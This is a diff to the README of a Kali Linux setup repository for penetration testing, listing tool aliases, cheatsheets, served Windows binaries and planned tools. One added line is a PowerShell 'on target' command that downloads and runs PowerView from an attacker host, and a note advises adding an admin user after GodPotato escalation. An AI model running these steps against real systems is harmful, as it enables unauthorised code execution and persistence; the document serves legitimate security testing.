@@ -37,26 +37,42 @@ sudo -sE ./install.sh 2>install.err
 - Built in cheatsheets using [Navi](https://github.com/denisidoro/navi)
 ```
 navi --print
+# alias is 'n'
+n
 ```
 - Windows binaries symlinked into Apache webroot
 ```
 # binaries located in /var/www/html/win/
 sudo systemctl start apache2
+# on target
+IEX(New-Object Net.WebClient).DownloadString("http://<LHOST>/win/powerview.ps1")
 ```
-- Optional install scripts in `kali-clean/optional_installs/`
+- Modularity: Optional install scripts in `kali-clean/optional_installs/`
+```
+# example: you want to install python2 for legacy python exploits
+# reference: https://www.kali.org/docs/general-use/using-eol-python-versions/
+# simply run the following script from the optional_installs folder
+./install_python2.sh
+```
 - IP address of `tun0` is displayed, no need to run `ip a` everytime
-- Better firefox profile: Removed default bookmarks, ublock, foxyproxy, wappalyzer and restore tabs on startup.
+- Better firefox profile: Removed default bookmarks, added useful extensions (eg. foxyproxy) and made restore tabs on startup the default.
 
 ## TODOs
 
 - [AD] https://github.com/eladshamir/Whisker
 - alias navi to n
+- Bloodhound to Bloodhound CE https://blog.spookysec.net//Deploying-BHCE/
+- CrackMapExec to NetExec https://github.com/Pennyw0rth/NetExec
+- Ligolo-ng as alternative to chisel https://github.com/nicocha30/ligolo-ng
 
 ## Checkout
 Below are things I will get around to trying and will add them to the install script if I find them useful.
 - https://github.com/Flangvik/SharpCollection
 - https://github.com/bohops/GhostBuild
 - https://github.com/AdrianVollmer/PowerHub
+- https://github.com/BeichenDream/GodPotato
+- https://github.com/antonioCoco/RunasCs
+- Note: If using GodPotato, it's easier to create a new admin user and switch to them with RunasCs.
 
 ## Credit
 - https://github.com/AyoItsYas/Mainte
